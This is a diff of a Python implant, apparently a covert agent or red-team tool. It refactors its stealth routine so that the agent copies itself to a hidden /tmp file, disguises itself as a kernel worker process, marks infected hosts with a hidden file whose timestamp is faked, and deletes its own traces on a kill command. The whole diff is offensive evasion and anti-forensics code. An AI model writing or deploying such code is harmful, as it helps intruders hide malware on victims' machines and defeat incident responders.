@@ -242,10 +242,11 @@ def become_silent():
 
 	cmdline = sys.argv[0]
 
+
 	# TODO randomize names, dependant on parent, windows location
 	hidden, bandit = "/tmp/.mem_systemd", "[kworker/2:0-events]"
-	if not check_mark() and cmdline != hidden:
-		leave_mark()
+	if not presence("CHECK") and cmdline != hidden:
+		presence("LEAVE")
 		print("No presence detected, going in...")
 		shutil.copyfile(cmdline, hidden)
 		subprocess.run(["/bin/chmod", "+x", f"{hidden}"])
@@ -258,7 +259,7 @@ def become_silent():
 		print("Agent is covert!")
 	else:
 		print("Already present, killing...")
-		leave_mark()
+		presence("LEAVE")
 		# Should die if already on system
 		exit(0)
 
@@ -276,28 +277,28 @@ def randomize_timestamp(file):
 	os.utime(file, (set_stamp, set_stamp))
 
 
-def leave_mark():
-	"""
-	Generate IOCs on machine, to leave presence clear
-	"""
+def presence(mode):
 	# TODO add more names, randomize
-	f = open(f"{str(pathlib.Path.home())}/.zshconf", "w")
-	f.close()
-	randomize_timestamp(f"{str(pathlib.Path.home())}/.zshconf")
-	os.environ["BASH"] = "1"
+	touch = f"{str(pathlib.Path.home())}/.zshconf"
+	env = "BASH"
 
-
-def check_mark():
-	"""
-
-	Returns:
-
-	"""
-	if os.path.isfile(f"{str(pathlib.Path.home())}/.zshconf"):
+	if mode == "KILL":
+		os.remove(touch)
+		del os.environ[env]
+		os.remove(sys.argv[0])
+		exit(0)
+	elif mode == "LEAVE":
+		f = open(touch, "w")
+		f.close()
+		randomize_timestamp(touch)
+		os.environ[env] = "1"
 		return True
-	if os.environ.get("BASH") == "1":
-		return True
-	return False
+	elif mode == "CHECK":
+		if os.path.isfile(touch):
+			return True
+		if os.environ[env] == "1":
+			return True
+		return False
 
 
 def delay_for_mode(mode):
